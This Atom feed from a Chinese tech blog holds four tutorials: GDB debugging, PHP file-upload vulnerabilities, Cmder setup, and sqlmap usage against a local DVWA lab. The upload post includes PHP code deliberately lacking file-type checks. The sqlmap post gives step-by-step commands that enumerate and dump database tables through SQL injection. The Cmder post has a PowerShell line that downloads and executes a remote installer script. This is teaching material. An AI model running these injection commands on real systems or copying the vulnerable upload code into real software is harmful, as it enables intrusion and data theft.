<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>只为不凡而来</title>
  <subtitle>小智的世界</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-03-27T07:43:23.427Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>wuduozhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>工具|gdb调试</title>
    <link href="http://yoursite.com/2018/03/27/%E5%B7%A5%E5%85%B7-gdb%E8%B0%83%E8%AF%95/"/>
    <id>http://yoursite.com/2018/03/27/工具-gdb调试/</id>
    <published>2018-03-27T14:48:03.000Z</published>
    <updated>2018-03-27T07:43:23.427Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GDB概述"><a href="#GDB概述" class="headerlink" title="GDB概述"></a>GDB概述</h3><p>GDB是GNU开源组织发布的一个强大的UNIX下的程序调试工具。或许，各位比较喜欢那种图形界面方式的，像VC、BCB等IDE的调试，但如果你是在UNIX平台下做软件，你会发现GDB这个调试工具有比VC、BCB的图形化调试器更强大的功能。所谓“寸有所长，尺有所短”就是这个道理。</p>
<p>一般来说，GDB主要帮忙你完成下面四个方面的功能：</p>
<ol>
<li>启动你的程序，可以按照你的自定义的要求随心所欲的运行程序。</li>
<li>可让被调试的程序在你所指定的调置的断点处停住。（断点可以是条件表达式）</li>
<li>当程序被停住时，可以检查此时你的程序中所发生的事。</li>
<li>动态的改变你程序的执行环境。</li>
</ol>
<p>从上面看来，GDB和一般的调试工具没有什么两样，基本上也是完成这些功能，不过在细节上，你会发现GDB这个调试工具的强大，大家可能比较习惯了图形化的调试工具，但有时候，命令行的调试工具却有着图形化工具所不能完成的功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div></pre></td><td class="code"><pre><div class="line">源程序：tst.c</div><div class="line"></div><div class="line">     1 #include &lt;stdio.h&gt;</div><div class="line">     2</div><div class="line">     3 int func(int n)</div><div class="line">     4 &#123;</div><div class="line">     5         int sum=0,i;</div><div class="line">     6         for(i=0; i&lt;n; i++)</div><div class="line">     7         &#123;</div><div class="line">     8                 sum+=i;</div><div class="line">     9         &#125;</div><div class="line">    10         return sum;</div><div class="line">    11 &#125;</div><div class="line">    12</div><div class="line">    13</div><div class="line">    14 main()</div><div class="line">    15 &#123;</div><div class="line">    16         int i;</div><div class="line">    17         long result = 0;</div><div class="line">    18         for(i=1; i&lt;=100; i++)</div><div class="line">    19         &#123;</div><div class="line">    20                 result += i;</div><div class="line">    21         &#125;</div><div class="line">    22</div><div class="line">    23        printf(&quot;result[1-100] = %d /n&quot;, result );</div><div class="line">    24        printf(&quot;result[1-250] = %d /n&quot;, func(250) );</div><div class="line">    25 &#125;</div><div class="line"></div><div class="line">编译生成执行文件：（Linux下）</div><div class="line">    hchen/test&gt; cc -g tst.c -o tst</div><div class="line"></div><div class="line">使用GDB调试：</div><div class="line"></div><div class="line">hchen/test&gt; gdb tst  &lt;---------- 启动GDB</div><div class="line">GNU gdb 5.1.1</div><div class="line">Copyright 2002 Free Software Foundation, Inc.</div><div class="line">GDB is free software, covered by the GNU General Public License, and you are</div><div class="line">welcome to change it and/or distribute copies of it under certain conditions.</div><div class="line">Type &quot;show copying&quot; to see the conditions.</div><div class="line">There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i386-suse-linux&quot;...</div><div class="line">(gdb) l     &lt;-------------------- l命令相当于list，从第一行开始例出原码。</div><div class="line">1        #include &lt;stdio.h&gt;</div><div class="line">2</div><div class="line">3        int func(int n)</div><div class="line">4        &#123;</div><div class="line">5                int sum=0,i;</div><div class="line">6                for(i=0; i&lt;n; i++)</div><div class="line">7                &#123;</div><div class="line">8                        sum+=i;</div><div class="line">9                &#125;</div><div class="line">10               return sum;</div><div class="line">(gdb)       &lt;-------------------- 直接回车表示，重复上一次命令</div><div class="line">11       &#125;</div><div class="line">12</div><div class="line">13</div><div class="line">14       main()</div><div class="line">15       &#123;</div><div class="line">16               int i;</div><div class="line">17               long result = 0;</div><div class="line">18               for(i=1; i&lt;=100; i++)</div><div class="line">19               &#123;</div><div class="line">20                       result += i;    </div><div class="line">(gdb) break 16    &lt;-------------------- 设置断点，在源程序第16行处。</div><div class="line">Breakpoint 1 at 0x8048496: file tst.c, line 16.</div><div class="line">(gdb) break func  &lt;-------------------- 设置断点，在函数func()入口处。</div><div class="line">Breakpoint 2 at 0x8048456: file tst.c, line 5.</div><div class="line">(gdb) info break  &lt;-------------------- 查看断点信息。</div><div class="line">Num Type           Disp Enb Address    What</div><div class="line">1   breakpoint     keep y   0x08048496 in main at tst.c:16</div><div class="line">2   breakpoint     keep y   0x08048456 in func at tst.c:5</div><div class="line">(gdb) r           &lt;--------------------- 运行程序，run命令简写</div><div class="line">Starting program: /home/hchen/test/tst</div><div class="line"></div><div class="line">Breakpoint 1, main () at tst.c:17    &lt;---------- 在断点处停住。</div><div class="line">17               long result = 0;</div><div class="line">(gdb) n          &lt;--------------------- 单条语句执行，next命令简写。</div><div class="line">18               for(i=1; i&lt;=100; i++)</div><div class="line">(gdb) n</div><div class="line">20                       result += i;</div><div class="line">(gdb) n</div><div class="line">18               for(i=1; i&lt;=100; i++)</div><div class="line">(gdb) n</div><div class="line">20                       result += i;</div><div class="line">(gdb) c          &lt;--------------------- 继续运行程序，continue命令简写。</div><div class="line">Continuing.</div><div class="line">result[1-100] = 5050       &lt;----------程序输出。</div><div class="line"></div><div class="line">Breakpoint 2, func (n=250) at tst.c:5</div><div class="line">5                int sum=0,i;</div><div class="line">(gdb) n</div><div class="line">6                for(i=1; i&lt;=n; i++)</div><div class="line">(gdb) p i        &lt;--------------------- 打印变量i的值，print命令简写。</div><div class="line">$1 = 134513808</div><div class="line">(gdb) n</div><div class="line">8                        sum+=i;</div><div class="line">(gdb) n</div><div class="line">6                for(i=1; i&lt;=n; i++)</div><div class="line">(gdb) p sum</div><div class="line">$2 = 1</div><div class="line">(gdb) n</div><div class="line">8                        sum+=i;</div><div class="line">(gdb) p i</div><div class="line">$3 = 2</div><div class="line">(gdb) n</div><div class="line">6                for(i=1; i&lt;=n; i++)</div><div class="line">(gdb) p sum</div><div class="line">$4 = 3</div><div class="line">(gdb) bt        &lt;--------------------- 查看函数堆栈。</div><div class="line">#0  func (n=250) at tst.c:5</div><div class="line">#1  0x080484e4 in main () at tst.c:24</div><div class="line">#2  0x400409ed in __libc_start_main () from /lib/libc.so.6</div><div class="line">(gdb) finish    &lt;--------------------- 退出函数。</div><div class="line">Run till exit from #0  func (n=250) at tst.c:5</div><div class="line">0x080484e4 in main () at tst.c:24</div><div class="line">24              printf(&quot;result[1-250] = %d /n&quot;, func(250) );</div><div class="line">Value returned is $6 = 31375</div><div class="line">(gdb) c     &lt;--------------------- 继续运行。</div><div class="line">Continuing.</div><div class="line">result[1-250] = 31375    &lt;----------程序输出。</div><div class="line"></div><div class="line">Program exited with code 027. &lt;--------程序退出，调试结束。</div><div class="line">(gdb) q     &lt;--------------------- 退出gdb。</div><div class="line">hchen/test&gt;</div></pre></td></tr></table></figure>
<p>好了，有了以上的感性认识，还是让我们来系统地认识一下gdb吧。</p>
<h3 id="使用GDB"><a href="#使用GDB" class="headerlink" title="使用GDB"></a>使用GDB</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>file &lt;文件名&gt;</td>
<td>加载被调试的可执行程序文件。因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。</td>
<td>(gdb) file gdb-sample</td>
</tr>
<tr>
<td>r</td>
<td>Run的简写，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。</td>
<td>(gdb) r</td>
</tr>
<tr>
<td>c</td>
<td>Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。</td>
<td>(gdb) c</td>
</tr>
<tr>
<td>b &lt;行号&gt; b &lt;函数名称&gt; b <em>&lt;函数名称&gt; b </em>&lt;代码地址&gt; d [编号]</td>
<td>b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。</td>
<td>(gdb) b 8 (gdb) b main  (gdb) b <em>main  (gdb) b </em>0x804835c  (gdb) d</td>
</tr>
<tr>
<td>s, n</td>
<td>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；n: 执行一行源程序代码，此行代码中的函数调用也一并执行。s 相当于其它调试器中的“Step Into (单步跟踪进入)”；n 相当于其它调试器中的“Step Over (单步跟踪)”。这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。</td>
<td>(gdb) s   (gdb) n</td>
</tr>
<tr>
<td>si, ni</td>
<td>si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。</td>
<td>(gdb) si (gdb) ni</td>
</tr>
<tr>
<td>p &lt;变量名称&gt;</td>
<td>Print的简写，显示指定变量（临时变量或全局变量）的值。</td>
<td>(gdb) p i  (gdb) p nGlobalVar</td>
</tr>
<tr>
<td>display …    undisplay &lt;编号&gt;</td>
<td>display，设置程序中断后欲显示的数据及其格式。例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令“display /i $pc”其中 $pc 代表当前汇编指令，/i表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。undispaly，取消先前的display设置，编号从1开始递增。</td>
<td>(gdb) display /i $pc (gdb) undisplay 1</td>
</tr>
<tr>
<td>i</td>
<td>Info的简写，用于显示各类信息，详情请查阅“help i”。</td>
<td>(gdb) i r</td>
</tr>
<tr>
<td>q</td>
<td>Quit的简写，退出GDB调试环境。</td>
<td>(gdb) q</td>
</tr>
<tr>
<td>help [命令名称]</td>
<td>GDB帮助命令，提供对GDB名种命令的解释说明。如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。</td>
<td>(gdb) help display</td>
</tr>
</tbody>
</table>
<p><a href="https://blog.csdn.net/haoel/article/details/2879" target="_blank" rel="external">用GDB调试程序(一)</a><br><a href="https://blog.csdn.net/liigo/article/details/582231" target="_blank" rel="external">GDB十分钟教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;GDB概述&quot;&gt;&lt;a href=&quot;#GDB概述&quot; class=&quot;headerlink&quot; title=&quot;GDB概述&quot;&gt;&lt;/a&gt;GDB概述&lt;/h3&gt;&lt;p&gt;GDB是GNU开源组织发布的一个强大的UNIX下的程序调试工具。或许，各位比较喜欢那种图形界面方式的，像VC、BCB
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-文件上传漏洞</title>
    <link href="http://yoursite.com/2018/03/27/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/03/27/PHP-PHP漏洞全解-文件上传漏洞/</id>
    <published>2018-03-26T22:25:14.000Z</published>
    <updated>2018-03-26T16:41:23.111Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意PHP文件，并能够将这些文件传递给 PHP解释器，就可以在远程服务器上执行任意PHP脚本，即文件上传漏洞。</p>
<p>一套web应用程序，一般都会提供文件上传的功能，方便来访者上传一些文件。</p>
<p>下面是一个简单的文件上传表单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;form1&quot;&gt; </div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;&lt;br /&gt; </div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt; </div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1024&quot; /&gt; </div><div class="line">&lt;form&gt;</div></pre></td></tr></table></figure></p>
<p>php的配置文件php.ini，其中选项upload_max_filesize指定允许上传的文件大小，默认是2M，可根据实际情况修改。</p>
<h3 id="FILES数组变量"><a href="#FILES数组变量" class="headerlink" title="$_FILES数组变量"></a>$_FILES数组变量</h3><p>PHP使用变量$_FILES来上传文件，$_FILES是一个数组。如果上传test.txt，那么$_FILES数组的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$FILES </div><div class="line">Array </div><div class="line">&#123; </div><div class="line">    [file] =&gt; Array </div><div class="line">        &#123; </div><div class="line">            [name] =&gt; test.txt //文件名称 </div><div class="line">            [type] =&gt; text/plain //MIME类型 </div><div class="line">            [tmp_name] =&gt; /tmp/php5D.tmp //临时文件 </div><div class="line">            [error] =&gt; 0 //错误信息 </div><div class="line">            [size] =&gt; 536 //文件大小，单位字节 </div><div class="line">        &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果上传文件按钮的name属性值为file，即<br><code>&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</code></p>
<p>那么使用$_FILES[‘file’][‘name’]来获得客户端上传文件名称，不包含路径。使用$_FILES[‘file’][‘tmp_name’]来获得服务端保存上传文件的临时文件路径。</p>
<h4 id="存放上传文件"><a href="#存放上传文件" class="headerlink" title="存放上传文件"></a>存放上传文件</h4><p>PHP不会直接将上传文件放到网站根目录中，而是保存为一个临时文件，名称就是$_FILES[‘file’][‘tmp_name’]的值，开发者必须把这个临时文件复制到存放的网站文件夹中。</p>
<p>$_FILES[‘file’][‘tmp_name’]的值是由PHP设置的，与文件原始名称不一样，开发者必须使用$_FILES[‘file’][‘name’]来取得上传文件的原始名称。</p>
<h4 id="传文件时的错误信息"><a href="#传文件时的错误信息" class="headerlink" title="传文件时的错误信息"></a>传文件时的错误信息</h4><p>$_FILES[‘file’][‘error’]变量用来保存上传文件时的错误信息，它的值如下：</p>
<table>
<thead>
<tr>
<th>错误信息</th>
<th>数值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>UPLOAD_ERR_OK</td>
<td>0</td>
<td>没有错误</td>
</tr>
<tr>
<td>UPLOAD_ERR_INI_SIZE</td>
<td>1</td>
<td>上传文件的大小超过php.ini的设置</td>
</tr>
<tr>
<td>UPLOAD_ERR_FROM_SIZE</td>
<td>2</td>
<td>上传文件的大小超过HTML表单中MAX_FILE_SIZE的值</td>
</tr>
<tr>
<td>UPLOAD_ERR_PARTIAL</td>
<td>3</td>
<td>只上传部分的文件</td>
</tr>
<tr>
<td>UPLOAD_ERR_NO_FILE</td>
<td>4</td>
<td>没有文件上传</td>
</tr>
</tbody>
</table>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>如果提供给网站访问者上传图片的功能，那必须小心访问者上传的实际可能不是图片，而是可以指定的PHP程序。如果存放图片的目录是一个开放的文件夹，则入侵者就可以远程执行上传的PHP文件来进行攻击。</p>
<p>下面是一个简单的文件上传例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">php </div><div class="line">// 设置上传文件的目录 </div><div class="line">$uploaddir = &quot;D:/www/images/&quot;; </div><div class="line">// 检查file是否存在 </div><div class="line">if (isset($_FILES[&apos;file1&apos;])) </div><div class="line">&#123; </div><div class="line">    // 要放在网站目录中的完整路径，包含文件名 </div><div class="line">    $uploadfile = $uploaddir . $_FILES[&apos;file1&apos;][&apos;name&apos;]; </div><div class="line">    // 将服务器存放的路径，移动到真实文件名 </div><div class="line">    move_uploaded_file($_FILES[&apos;file1&apos;][&apos;tmp_name&apos;],$uploadfile); </div><div class="line">&#125; </div><div class="line">?&gt; </div><div class="line">…… </div><div class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;form1&quot;&gt; </div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;&lt;br /&gt; </div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt; </div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1024&quot; /&gt; </div><div class="line">&lt;form&gt;</div></pre></td></tr></table></figure>
<p>这个例子没有检验文件后缀，可以上传任意文件，很明显的上传漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;由于文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意PHP文件，并能够
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>工具|Cmder使用教程</title>
    <link href="http://yoursite.com/2018/03/27/%E5%B7%A5%E5%85%B7-Cmder%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/03/27/工具-Cmder使用教程/</id>
    <published>2018-03-26T17:12:20.000Z</published>
    <updated>2018-03-26T09:30:36.031Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://cmder.net/" target="_blank" rel="external">Cmder官网</a>（它把 conemu，msysgit 和 clink 打包在一起，让你无需配置就能使用一个真正干净的 Linux 终端！它甚至还附带了漂亮的 monokai 配色主题。）;作为一个压缩档的存在, 可即压即用。你甚至可以放到 USB 就可以虽时带着走，连调整过的设定都会放在这个目录下，不会用到系统机码(Registry)，所以也很适合放在 Dropbox / Google Drive / OneDrive 共享于多台电脑。</p>
<h3 id="修改-chocolatey-安装路径"><a href="#修改-chocolatey-安装路径" class="headerlink" title="修改 chocolatey 安装路径"></a>修改 chocolatey 安装路径</h3><p>最新版本的 chocolatey 的默认安装路径是：</p>
<p><code>C:\ProgramData\Chocolatey</code><br>如何修改为自己的路径呢？</p>
<p>在 系统环境变量 中增加 ChocolateyInstall：</p>
<p><code>d:\chocolatey</code></p>
<p>然后打开 cmd 窗口，执行如下命令：</p>
<p><code>@powershell -NoProfile -ExecutionPolicy unrestricted -Command &quot;(iex ((new-object net.webclient).DownloadString(&#39;https://chocolatey.org/install.ps1&#39;))) &gt;$null 2&gt;&amp;1&quot; &amp;&amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin</code></p>
<p><a href="https://vxhly.github.io/2017/04/install-cmder-on-windows/" target="_blank" rel="external">在 windows 下安装 Cmder</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://cmder.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Cmder官网&lt;/a
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Web安全|Sqlmap的使用入门</title>
    <link href="http://yoursite.com/2018/03/26/Web%E5%AE%89%E5%85%A8-Sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"/>
    <id>http://yoursite.com/2018/03/26/Web安全-Sqlmap的使用入门/</id>
    <published>2018-03-26T11:19:43.000Z</published>
    <updated>2018-03-26T06:08:39.060Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）</p>
<h3 id="SQLmap-环境"><a href="#SQLmap-环境" class="headerlink" title="SQLmap 环境"></a>SQLmap 环境</h3><ul>
<li>python 2.7.x</li>
<li>Sqlmap <a href="https://sqlmap.org/" target="_blank" rel="external">官网下载</a></li>
</ul>
<p>将 SQLmap 解压至 Python 目录下，将 SQLmap 的程序目录重命名为 sqlmap</p>
<ul>
<li>DVWA  <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="external">Github 下载地址</a><br>DVWA(Dam Vulnerable Web Application) 使用 PHP+Mysql 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。</li>
</ul>
<p>注:[在 Windows 下还需安装 PHP 环境，这里推介两个 PHP 集成环境 (Wamp、phpStudy)]</p>
<h3 id="SQlmap-使用方法"><a href="#SQlmap-使用方法" class="headerlink" title="SQlmap 使用方法"></a>SQlmap 使用方法</h3><p>本次实验的目的：使用 SQLmap 得到以下信息：</p>
<ul>
<li>枚举 MYSQL 用户名与密码。</li>
<li>枚举所有数据库。</li>
<li>枚举指定数据库的数据表。</li>
<li>枚举指定数据表中的所有用户名与密码。</li>
</ul>
<h4 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h4><p>Windows：查看 Python 帮助命令 <code>python sqlmap.py -h</code></p>
<p>选项解释</p>
<ul>
<li>–cookie =&gt; 设置我们的 cookie 值 “将 DVWA 安全等级设置为 low”</li>
<li>–data =&gt; 设置 POST 提交的值，如果是 GET 提交，不需要此选项</li>
<li>-u =&gt; 指定目标 URL</li>
<li>-b =&gt; 获取 DBMS banner</li>
<li>–current-db =&gt; 获取当前数据库</li>
<li>–current-user =&gt; 获取当前数据库的用户</li>
<li>–tables =&gt; 获取数据库里所有的表名</li>
<li>–columns =&gt; 获取表里的所有字段</li>
<li>–dump =&gt; 获取值</li>
<li>–current-user =&gt; 获取当前用户</li>
<li>-D =&gt; 爆库指定数据库名</li>
<li>-T =&gt; 爆库指定表名</li>
<li>-C =&gt; 爆库指定字段名</li>
<li>–string =&gt; 当查询可用时用来匹配页面中的字符串</li>
<li>–users =&gt; 枚举 DBMS 用户</li>
<li>–password =&gt; 枚举 DBMS 用户密码 hash</li>
<li>–dbs =&gt; 枚举 DBMS 中的数据库</li>
</ul>
<h4 id="开始爆库-DVWA-的难度为-low"><a href="#开始爆库-DVWA-的难度为-low" class="headerlink" title="开始爆库 [DVWA 的难度为 low]"></a>开始爆库 [DVWA 的难度为 low]</h4><h5 id="先获取-Cookie"><a href="#先获取-Cookie" class="headerlink" title="先获取 Cookie"></a>先获取 Cookie</h5><p>登录DVWA，开开发者工具，查看cookie,复制下来，看图：</p>
<p><img src="/images/sqlmap使用-01.png" alt="Sqlmap使用" title="sqlmap使用-01"></p>
<h5 id="获取数据库，–current-db"><a href="#获取数据库，–current-db" class="headerlink" title="获取数据库，–current-db"></a>获取数据库，–current-db</h5><p>for example<br><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot; --current-db</code></p>
<blockquote>
<p>URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 –current-db 的 - 可是有两个的。</p>
</blockquote>
<p><img src="/images/sqlmap使用-02.png" alt="获取数据库" title="sqlmap使用-02"></p>
<h5 id="获取表，–tables"><a href="#获取表，–tables" class="headerlink" title="获取表，–tables"></a>获取表，–tables</h5><blockquote>
<p>前面，我们已经获取到数据库名，这时候我们要指定数据库名。使用 -D 选项指定数据库名。注意 –tables 的 - 可是有两个的。</p>
</blockquote>
<p>For Example:<br><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot;  -D &#39;dvwa&#39; --tables</code></p>
<p><img src="/images/sqlmap使用-03.png" alt="获取表" title="sqlmap使用-03"></p>
<h5 id="获取字段，–columns"><a href="#获取字段，–columns" class="headerlink" title="获取字段，–columns"></a>获取字段，–columns</h5><blockquote>
<p>前面，我们已经获取到数据库名和表名了，这时候我们要指定数据库名和表名。使用 -D 选项指定数据库名，使用 -T 指定表名。这里我们选择表 users。注意 –columns 的 - 可是有两个的。</p>
</blockquote>
<p>For Example:</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot; -D &#39;dvwa&#39; -T &#39;users&#39; --columns</code></p>
<p><img src="/images/sqlmap使用-04.png" alt="获取字段" title="sqlmap使用-04"></p>
<h5 id="获取数据，–dump"><a href="#获取数据，–dump" class="headerlink" title="获取数据，–dump"></a>获取数据，–dump</h5><blockquote>
<p>前面，我们已经获取到数据库名、表名还有字段名了，这时候我们要指定数据库名、表名还有字段名。使用 -D 选项指定数据库名，使用 -T 指定表名，使用 -C 指定字段名。这里我们选择表 users中的字段 user_id。注意 –dump 的 - 可是有两个的。</p>
</blockquote>
<p>For Example:</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot; -D &#39;dvwa&#39; -T &#39;users&#39; -C &#39;user_id&#39; --dump</code></p>
<p><img src="/images/sqlmap使用-05.png" alt="获取数据" title="sqlmap使用-05"></p>
<h3 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h3><p>这就是Sqlmap的简单使用了，希望对你们有帮助。</p>
<p><a href="https://vxhly.github.io/2016/09/usage-of-sqlmap/" target="_blank" rel="external">渗透工具用法（一）：SQLmap 的用法</a></p>
]]></content>
    
    <summary type="html">
    
